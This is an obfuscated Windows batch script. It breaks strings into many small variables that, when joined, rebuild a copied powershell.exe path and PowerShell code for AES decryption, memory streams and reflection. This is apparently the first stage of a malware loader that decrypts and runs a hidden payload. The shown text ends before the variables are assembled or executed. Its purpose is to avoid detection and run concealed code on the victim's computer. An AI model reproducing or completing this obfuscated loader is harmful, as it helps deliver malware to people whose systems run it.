@echo off
set "gOqJGuOtAZ=y "
set "mnaUUPBBBk=xe"
set "HRpWlwaHPm=:\"
set "MsvoNtFAEg=st"
set "LSvpewPDen= /"
set "QQOeBKzwWo=32"
set "yTBsKzAfUE=ow"
set "bmmvTZJySF=ll"
set "bGhKjyAaJB=Po"
set "KBYMkyCrvI=1."
set "GsslmAwqeZ=po"
set "fZbLDriMzK=he"
set "KbwjtOSTUg=s\"
set "ngToGlexhi=Wi"
set "LYCDyHPDKs=em"
set "PCmeBUFVaf=we"
set "ELlHkEtuYw=.e"
set "YOuevvelPB=Sy"
set "NowsfZOZcX=rS"
set "jrpNvalRGO=in"
set "CVDuAjHlNT=0\"
set "UjDpLxJkLh=ws"
set "rPcfaKJlvG=py"
set "JlNdgJJIlA=nd"
set "rafyMZsRom=he"
set "vDHkEltvHQ=ll"
set "VLhAsclBnf= C"
set "KRDPtMkPEj=\v"
set "GABxLWErMd=do"
set "zIQiIVMSHV=we"
set "JcZYnPnjpk=rs"
set "vopsRrFiwZ=\W"
set "uRjEDJvOxr=co"
set "NpVsHpAtvj= %~dp0"
set "hvxVHWcmCq=cd"
set "uhnpiACmwj=::De"
set "joargmfByw=)($x"
set "ffqJpIBpfa=fbZY"
set "ScLlkrxWTs=oryS"
set "DDXNcfoXSS=d;$Q"
set "DzlkYwkUwT=brea"
set "BgkHMEyvLs=t Sy"
set "FHRfdrpmJa=esMa"
set "acdgVdROnl=VUEr"
set "tOdxHsRmCZ=ss -"
set "bzxulVAIhe=eMVs"
set "rJpbFqtFzN=Obje"
set "iKBKyJMJBH=eam("
set "vtejSFIiPS=$iOK"
set "dGyUECWZaB=($tO"
set "SDJLGumdmU=$QcN"
set "pdJWCPcJJP=grap"
set "RGQYYIRMTf=and "
set "PeGQZLQWjq=urit"
set "rGRDPMKMPV=pose"
set "WeOxTayyZx=xjKc"
set "kZjOaSYtlt=);$Q"
set "CkTyKaisqK=106u"
set "WlqQODNFTF=JVqF"
set "vMEqzkPGMc=$xEH"
set "CxaNTPVvYi=();$"
set "xlTvwdJTSP=yTo("
set "PFvtQnYnCI= = $"
set "ZTmQeSkouC=.Cre"
set "UWyEtHXbry=oArr"
set "xgKqrulIRa=th('"
set "KJAYuFmHDH=y.Cr"
set "xrMaRCixXd=ct S"
set "nNbZSZFdiO=q = "
set "qTAECuxTgr=M) {"
set "QToMsjGguK= '')"
set "KPZnnEyHyu=flec"
